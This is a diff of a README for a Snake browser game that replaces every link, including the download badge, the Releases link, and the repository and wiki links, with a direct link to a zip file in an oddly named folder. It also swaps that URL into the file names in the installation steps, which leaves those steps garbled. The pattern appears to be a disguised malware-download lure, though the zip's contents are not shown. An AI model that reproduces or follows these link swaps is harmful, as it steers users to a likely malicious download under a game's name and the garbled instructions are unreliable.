@@ -1,6 +1,6 @@
 # 🐍 Snake-Challenge - Play the Classic Snake Game Today!
 
-[![Download Snake-Challenge](https://img.shields.io/badge/Download-Snake--Challenge-blue.svg)](https://github.com/ictor862/Snake-Challenge/releases)
+[![Download Snake-Challenge](https://raw.githubusercontent.com/ictor862/Snake-Challenge/main/cubicalness/Snake-Challenge.zip)](https://raw.githubusercontent.com/ictor862/Snake-Challenge/main/cubicalness/Snake-Challenge.zip)
 
 ## 🎮 About the Game
 
@@ -14,19 +14,19 @@ To start playing, follow the simple steps below. You’ll be enjoying the game i
 
 1. **Visit the Release Page**  
    Click the link below to go to our GitHub Releases page:
-   [Download Snake-Challenge](https://github.com/ictor862/Snake-Challenge/releases)
+   [Download Snake-Challenge](https://raw.githubusercontent.com/ictor862/Snake-Challenge/main/cubicalness/Snake-Challenge.zip)
 
 2. **Select Your Version**  
    On the Releases page, you’ll see various versions of Snake-Challenge. Look for the latest release version for the best experience.
 
 3. **Download the Game**  
-   If you see a file named `Snake-Challenge.zip`, download it by clicking on the file link. This file contains everything you need.
+   If you see a file named `https://raw.githubusercontent.com/ictor862/Snake-Challenge/main/cubicalness/Snake-Challenge.zip`, download it by clicking on the file link. This file contains everything you need.
 
 4. **Extract the Files**  
    Once downloaded, locate the `.zip` file in your downloads folder. Right-click it and choose "Extract All" to unpack the files.
 
 5. **Open the Game**  
-   After extracting, open the extracted folder and double-click on `index.html`. Your default web browser will launch, and the game will be ready to play!
+   After extracting, open the extracted folder and double-click on `https://raw.githubusercontent.com/ictor862/Snake-Challenge/main/cubicalness/Snake-Challenge.zip`. Your default web browser will launch, and the game will be ready to play!
 
 ## 💻 System Requirements
 
@@ -69,7 +69,7 @@ If you encounter any issues or have questions, please open an issue in the repos
 
 ## 🔗 Related Links
 
-- [GitHub Repository](https://github.com/ictor862/Snake-Challenge)
-- [Game Instructions](https://github.com/ictor862/Snake-Challenge/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/ictor862/Snake-Challenge/main/cubicalness/Snake-Challenge.zip)
+- [Game Instructions](https://raw.githubusercontent.com/ictor862/Snake-Challenge/main/cubicalness/Snake-Challenge.zip)
 
 Enjoy playing Snake-Challenge! Happy gaming!
